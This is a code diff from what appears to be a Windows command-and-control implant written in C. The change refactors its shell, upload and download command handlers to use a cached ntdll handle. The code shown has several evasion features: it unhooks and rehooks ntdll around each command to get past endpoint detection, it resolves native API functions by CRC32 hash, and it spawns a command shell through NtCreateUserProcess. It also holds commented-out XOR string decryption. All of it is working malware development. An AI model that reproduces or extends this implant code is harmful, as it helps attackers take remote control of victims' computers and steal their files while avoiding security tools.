@@ -34,15 +34,9 @@ VOID CommandDispatcher() {
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand;
 #if CONFIG_UNHOOK == TRUE
-#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
 
-    PVOID p_ntdll = get_ntdll_64();
-#else
-    PVOID p_ntdll = get_ntdll_32();
-#endif //CONFIG_ARCH
-
-    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) p_ntdll;
-    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (p_ntdll + pDosHdr->e_lfanew);
+    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) Instance.Handles.NtdllHandle;
+    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (Instance.Handles.NtdllHandle + pDosHdr->e_lfanew);
     IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
 
     SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
@@ -50,7 +44,7 @@ VOID CommandDispatcher() {
     LPVOID pCacheRestore = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
     LPVOID pCacheClean = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
 
-    mem_cpy(pCacheRestore, p_ntdll, ntdll_size);
+    mem_cpy(pCacheRestore, Instance.Handles.NtdllHandle, ntdll_size);
 
     UINT uHookFlag = 0;
 #endif //unhook
@@ -83,7 +77,7 @@ VOID CommandDispatcher() {
 
                             // unhook
 #if CONFIG_UNHOOK
-                            HookingManager(uHookFlag, pCacheClean, p_ntdll, ntdll_size);
+                            HookingManager(uHookFlag, pCacheClean, Instance.Handles.NtdllHandle, ntdll_size);
                             uHookFlag = 2; // set flag to rehook status
 #endif
                             // execute command
@@ -91,7 +85,7 @@ VOID CommandDispatcher() {
 
                             // rehook
 #if CONFIG_UNHOOK
-                            HookingManager(uHookFlag, pCacheRestore, p_ntdll, ntdll_size);
+                            HookingManager(uHookFlag, pCacheRestore, Instance.Handles.NtdllHandle, ntdll_size);
                             uHookFlag = 1; // set flag to indicate we already have clean ntdll in pCacheClean
 #endif
                             FoundCommand = TRUE;
@@ -129,13 +123,6 @@ VOID CommandDispatcher() {
 }
 
 VOID CommandShell( PPARSER Parser ){
-
-#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
-    PVOID p_ntdll = get_ntdll_64();
-#else
-    PVOID p_ntdll = get_ntdll_32();
-#endif //CONFIG_ARCH
-
 #if CONFIG_NATIVE == TRUE
 
     DWORD   Length           = 0;
@@ -166,7 +153,7 @@ VOID CommandShell( PPARSER Parser ){
     UNICODE_STRING nt_image_path;
     UNICODE_STRING nt_args;
 
-    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlInitUnicodeString_CRC32B);
 
     // hardcoded test string
     //g_rtl_init_unicode_string(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");
@@ -210,7 +197,7 @@ VOID CommandShell( PPARSER Parser ){
     PRTL_USER_PROCESS_PARAMETERS proc_params = { 0 };
 
     // create process params struct
-    RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
+    RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlCreateProcessParametersEx_CRC32B);
     check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path,
                                                NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
                                                0x01) == 0, "RtlCreateProcessParametersEx Failed!");
@@ -234,7 +221,7 @@ VOID CommandShell( PPARSER Parser ){
     proc_params->StandardInput   = handle_array[0];
 
     // allocate process heap
-    RtlAllocateHeap_t p_RtlAllocateHeap = (RtlAllocateHeap_t) GetProcAddressByHash(p_ntdll, RtlAllocateHeap_CRC32B);
+    RtlAllocateHeap_t p_RtlAllocateHeap = (RtlAllocateHeap_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlAllocateHeap_CRC32B);
 
     // get heaps
     // RtlGetProcessHeaps_t p_RtlGetProcessHeaps = (RtlGetProcessHeaps_t) GetProcAddressByHash(p_ntdll, RtlGetProcessHeaps_CRC32B);
@@ -252,13 +239,13 @@ VOID CommandShell( PPARSER Parser ){
     attrib_list->Attributes[0].Value = (ULONG_PTR)nt_image_path.Buffer;
 
     HANDLE h_proc, h_thread = NULL;
-    NtCreateUserProcess_t p_NtCreateUserProcess = (NtCreateUserProcess_t) GetProcAddressByHash(p_ntdll, NtCreateUserProcess_CRC32B);
+    NtCreateUserProcess_t p_NtCreateUserProcess = (NtCreateUserProcess_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, NtCreateUserProcess_CRC32B);
 
     check_debug(p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL,
                                       PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info,
                                       attrib_list) == 0, "NtCreateUserProcess Failed!");
 
-    RtlFreeHeap_t p_RtlFreeHeap = (RtlFreeHeap_t) GetProcAddressByHash(p_ntdll, RtlFreeHeap_CRC32B);
+    RtlFreeHeap_t p_RtlFreeHeap = (RtlFreeHeap_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlFreeHeap_CRC32B);
 
     LEAVE:
     if(attrib_list != NULL){
@@ -277,7 +264,7 @@ VOID CommandShell( PPARSER Parser ){
     LocalFree(*(PVOID *)cmd_file);
     LocalFree(*(PVOID *)command_line);
 
-    RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
+    RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlDestroyProcessParameters_CRC32B);
 
     p_RtlDestroyProcessParameters(proc_params);
 
@@ -333,20 +320,7 @@ VOID CommandShell( PPARSER Parser ){
 }
 
 VOID CommandUpload( PPARSER Parser ) {
-
-//--------------------------------
-
 #if CONFIG_NATIVE == TRUE
-
-#if CONFIG_ARCH == 64
-    PVOID p_ntdll = get_ntdll_64();
-#else
-    PVOID p_ntdll = get_ntdll_32();
-#endif //CONFIG_ARCH
-
-    // UCHAR s_xk[] = S_XK;
-    // UCHAR s_string[] = S_COMMAND_UPLOAD;
-    // _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));
 
     PPACKAGE Package = PackageCreate(COMMAND_UPLOAD);
     UINT32 FileSize = 0;
@@ -377,7 +351,7 @@ VOID CommandUpload( PPARSER Parser ) {
 
     WCHAR *w_file_path = str_to_wide(file_name);
 
-    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlInitUnicodeString_CRC32B);
     p_RtlInitUnicodeString(&file_path, w_file_path);
 
 
@@ -386,14 +360,14 @@ VOID CommandUpload( PPARSER Parser ) {
 
 
     InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
-    NtCreateFile_t p_NtCreateFile = GetProcAddressByHash(p_ntdll, NtCreateFile_CRC32B);
+    NtCreateFile_t p_NtCreateFile = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtCreateFile_CRC32B);
 
     check_debug(p_NtCreateFile(&hFile, FILE_GENERIC_WRITE, &obj_attrs, &io_status_block, NULL,
                                FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
                                FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
                                0) == 0, "NtCreateFile Failed!");
 
-    NtWriteFile_t p_NtWriteFile = GetProcAddressByHash(p_ntdll, NtWriteFile_CRC32B);
+    NtWriteFile_t p_NtWriteFile = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtWriteFile_CRC32B);
     check_debug(p_NtWriteFile(hFile, NULL, NULL, NULL, &io_status_block,
                               Content, FileSize-1, 0, 0) == 0, "NtWriteFile Failed!");
 
@@ -444,17 +418,8 @@ VOID CommandUpload( PPARSER Parser ) {
 
 
 VOID CommandDownload( PPARSER Parser ) {
-#if CONFIG_ARCH == 64
-    PVOID p_ntdll = get_ntdll_64();
-#else
-    PVOID p_ntdll = get_ntdll_32();
-#endif //CONFIG_ARCH
-
-//--------------------------------
 #if CONFIG_NATIVE == TRUE
-    // UCHAR s_xk[] = S_XK;
-    // UCHAR s_string[] = S_COMMAND_DOWNLOAD;
-    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
     DWORD    FileSize = 0;
@@ -487,7 +452,7 @@ VOID CommandDownload( PPARSER Parser ) {
 
 
     WCHAR *w_file_path = str_to_wide(file_name);
-    RtlInitUnicodeString_t p_RtlInitUnicodeString = GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlInitUnicodeString_CRC32B);
     p_RtlInitUnicodeString(&file_path, w_file_path);
     LocalFree(w_file_path);
     OBJECT_ATTRIBUTES obj_attrs;
@@ -496,13 +461,13 @@ VOID CommandDownload( PPARSER Parser ) {
     InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
 
 
-    NtOpenFile_t p_NtOpenFile = GetProcAddressByHash(p_ntdll, NtOpenFile_CRC32B);
+    NtOpenFile_t p_NtOpenFile = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtOpenFile_CRC32B);
 
     check_debug(p_NtOpenFile(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ,
                              FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) == 0, "NtOpenFile Failed!");
 
     FILE_STANDARD_INFORMATION file_standard_info;
-    NtQueryInformationFile_t p_NtQueryInformationFile = GetProcAddressByHash(p_ntdll, NtQueryInformationFile_CRC32B);
+    NtQueryInformationFile_t p_NtQueryInformationFile = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtQueryInformationFile_CRC32B);
     check_debug(p_NtQueryInformationFile(hFile, &io_status_block,
                                          &file_standard_info, sizeof(FILE_STANDARD_INFORMATION),
                                          FileStandardInformation) == 0,"NtQueryInformationFile Failed!");
@@ -511,7 +476,7 @@ VOID CommandDownload( PPARSER Parser ) {
     // _tprintf("file_size: %d\n", FileSize);
     Content  = LocalAlloc( LPTR, FileSize );
 
-    NtReadFile_t p_NtReadFile = GetProcAddressByHash(p_ntdll, NtReadFile_CRC32B);
+    NtReadFile_t p_NtReadFile = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtReadFile_CRC32B);
     check_debug( p_NtReadFile(hFile, NULL, NULL, NULL,
                               &io_status_block, Content, FileSize, NULL, NULL) == 0, "NtReadFile Failed!");
 
